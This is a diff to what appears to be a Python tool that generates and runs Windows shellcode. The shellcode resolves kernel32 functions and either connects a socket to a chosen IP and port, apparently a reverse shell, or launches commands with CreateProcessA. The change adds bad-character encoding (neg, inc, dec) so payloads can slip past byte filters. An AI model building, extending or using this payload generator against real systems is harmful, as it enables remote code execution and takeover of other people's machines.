@@ -69,7 +69,7 @@ def validate_arguments(args):
         sys.exit()
 
 
-def generate_shellcode(args):
+def generate_shellcode(args, bad_char_list):
     asm_code = create_asm_start(args.force_break)
     asm_code += find_kernel32()
     asm_code += resolve_kernel32_functions(DEFAULT_EXEC_FUNCTION, args.verbose, args.force_break_functions)
@@ -84,7 +84,7 @@ def generate_shellcode(args):
         asm_code += create_socket_and_connect(ip_hex, port_hex)
     else:
         for command in args.command or DEFAULT_COMMAND:
-            cmd_chunks = change_command_to_memory_hex(command, [['00', 'neg']], args.verbose)
+            cmd_chunks = change_command_to_memory_hex(command, bad_char_list, args.verbose)
             asm_code += create_command_string(cmd_chunks, 0, args.verbose, args.force_break_functions)
             asm_code += create_startup_info_a(0)
             asm_code += create_process_a(0)
@@ -111,12 +111,32 @@ def compile_and_execute_shellcode(asm_code, args):
     except Exception as e:
         print_info(f'Failed to compile the assembly: {e}', FAIL, 0, True)
 
+def parse_bad_chars(args):
+    bad_chars = []
+    if args.bad_char:
+        for hex_value, method in args.bad_char:
+            if method not in ['neg', 'inc', 'dec'] and not method.startswith('inc') and not method.startswith('dec'):
+                print_info(f'Invalid method {method} for bad character {hex_value}', FAIL, 0, True)
+                return False
+            try:
+                value = int(hex_value, 16)
+                bad_char = {'char': value, 'func': method[0:3]}
+                if len(method) > 3 and (method.startswith('inc') or method.startswith('dec')):
+                    bad_char['n'] = int(method[3:])
+                bad_chars.append(bad_char)
+            except ValueError:
+                print_info(f'Invalid hex value: {hex_value}', FAIL, 0, True)
+                return False
+    return bad_chars
 
 # Main Function
 def main():
     args = parse_arguments()
+    bad_char_list = [{'char': 0x00, 'func': 'neg'}]  # Default bad char if none provided
+    if args.bad_char:
+        bad_char_list = parse_bad_chars(args)
     validate_arguments(args)
-    asm_code = generate_shellcode(args)
+    asm_code = generate_shellcode(args, bad_char_list)
     compile_and_execute_shellcode(asm_code, args)
 
 
